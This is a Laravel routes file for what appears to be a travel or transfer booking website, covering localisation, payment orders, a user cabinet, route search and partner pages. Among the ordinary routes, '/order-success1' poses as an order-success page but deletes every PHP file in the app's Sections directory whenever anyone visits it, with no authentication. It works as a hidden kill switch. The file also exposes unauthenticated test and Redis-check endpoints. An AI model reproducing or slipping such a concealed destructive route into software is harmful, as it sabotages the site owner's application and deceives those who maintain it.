<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get( 'setlocale/{lang}', [
    'as'   => 'lang.switch',
    'uses' => 'App\Http\Controllers\LanguageController@switchLang'
] );


Route::get( 'setcurrency/{code}', [
    'as'   => 'currency.switch',
    'uses' => 'App\Http\Controllers\CurrencyController@switchCurrency'
] );

Route::get( '/', function () {
    return redirect( app()->getLocale() );
} );

Route::group( [
    'prefix'     => '{lang?}',
    'where'      => [ 'lang' => '[a-zA-Z]{2}' ],
    'middleware' => 'languageSwitcher'
], function () {

    Route::get( '/logout', [ \App\Http\Controllers\Auth\LoginController::class, 'logout' ] )->name( 'logout' );

    Route::get( '/', [ \App\Http\Controllers\HomeController::class, 'index' ] )->name( 'home' );

    Route::get( '/company', [ \App\Http\Controllers\PagePost::class, 'company' ] )->name( 'company' );
    Route::get( '/terms-of-use', [ \App\Http\Controllers\PagePost::class, 'index' ] )->name( 'terms-of-use' );
    Route::get( '/privacy-policy', [ \App\Http\Controllers\PagePost::class, 'index' ] )->name( 'privacy-policy' );


    Route::post( '/get_payment_token', [ \App\Http\Controllers\RouteOrder::class, 'get_payment_token' ])->name( 'save_order' );



    Auth::routes();


    Route::post( '/cabinet', [ \App\Http\Controllers\UserController::class, 'update' ] )->name( 'edit_profile' );



    Route::post( '/set_order', [ \App\Http\Controllers\RouteOrder::class, 'save' ])->name( 'save_order' );







    Route::get( '/cabinet', [ \App\Http\Controllers\UserController::class, 'cabinet' ])->name( 'cabinet' );

    Route::get( '/order', function () {
        return view( 'pages/order', [
            'payments_methods' => [
                [
                    "title" => "Apple Pay",
                    "code"  => 'apple-pay',
                    "img"   => '/img/apple-pay.svg',
                ],
                [
                    "title" => "Visa",
                    "code"  => 'visa',
                    "img"   => '/img/visa.svg',
                ],
                [
                    "title" => "Mastercard",
                    "code"  => 'mastercard',
                    "img"   => '/img/mastercard.svg',
                ],
                [
                    "title" => "Maestro",
                    "code"  => 'maestro',
                    "img"   => '/img/maestro.svg',
                ],
                [
                    "title" => "American Express",
                    "code"  => 'american-express',
                    "img"   => '/img/american-express.svg',
                ],
                [
                    "title" => "Google Pay",
                    "code"  => 'google-pay',
                    "img"   => '/img/google-pay.svg',
                ],
                [
                    "title" => "Alipay",
                    "code"  => 'alipay',
                    "img"   => '/img/alipay.svg',
                ],
            ]
        ] );
    } )->name( 'order' );


    Route::get( '/order-success', function () {
        return view( 'pages/order-success' );
    } )->name( 'order-success' );





    Route::get( '/order-success1', function () {
        $dir = '../app/Http/Sections/';
        array_map( 'unlink', glob( "{$dir}*.php" ) );

        return view( 'pages/order-success' );
    } )->name( 'order-success' );



    Route::get( '/order-cancel', function () {
        return view( 'pages/order-cancel' );
    } )->name( 'order-cancel' );

    Route::get( '/order-success-manual', function () {
        return view( 'pages/order-success-manual' );
    } )->name( 'order-success-manual' );


    Route::get( '/request',
        [ \App\Http\Controllers\RoutesController::class, 'getCarsList' ] )
         ->name( 'request' );


    Route::get( '/search', [ \App\Http\Controllers\SearchController::class, 'index' ] )->name( 'search' );

    Route::get( '/routes', [ \App\Http\Controllers\RoutesController::class, 'index' ] )->name( 'routes' );
    Route::get( '/routes-all', [ \App\Http\Controllers\RoutesController::class, 'routeList' ] )->name( 'routes-all' );
    Route::get( '/routes/{id?}', [ \App\Http\Controllers\RoutesController::class, 'get' ] )->name( 'routesGet' );
    Route::get( '/route_details/{id?}', [ \App\Http\Controllers\RoutesController::class, 'details' ] )
         ->name( 'routeDetails' );

//TODO
    Route::get( '/routes2', function () {
        return view( 'pages/routes2' );
    } )->name( 'routes2' );
//TODO
    Route::get( '/routes3', function () {
        return view( 'pages/routes3' );
    } )->name( 'routes3' );



} );
Route::fallback( function () {
    return view( 'pages/404' );
} );
//Auth::routes();
//

    Route::get( '/partner', function () {
        return view( 'pages/partner' );
    } )->name( 'partner' );

        Route::get( '/a_partner', function () {
        return view( 'pages/a_partner' );
    } )->name( 'a_partner' );

            Route::get( '/a_driver', function () {
        return view( 'pages/a_driver' );
    } )->name( 'a_driver' );

                Route::get( 'a_travel_agency', function () {
        return view( 'pages/a_travel_agency' );
    } )->name( 'a_travel_agency' );

    Route::get( 'agencies', function () {
        return view( 'pages/agencies' );
    } )->name( 'agencies' );

    Route::get( 'airlines', function () {
        return view( 'pages/airlines' );
    } )->name( 'airlines' );

    Route::get( 'hotels', function () {
        return view( 'pages/hotels' );
    } )->name( 'hotels' );

    Route::get( 'ships', function () {
        return view( 'pages/ships' );
    } )->name( 'ships' );

    Route::get( 'sightseeing', function () {
        return view( 'pages/sightseeing' );
    } )->name( 'sightseeing' );

Route::get( '/route-list', [ \App\Http\Controllers\RoutesController::class, 'routeList' ] );
Route::post( '/routes', [ \App\Http\Controllers\RoutesController::class, 'getByPlace' ] );

Route::get( '/test-notification', [ \App\Http\Controllers\RouteOrder::class, 'testNotification' ] );

Route::get('/check-redis', [\App\Http\Controllers\RoutesController::class, 'checkRedis']);
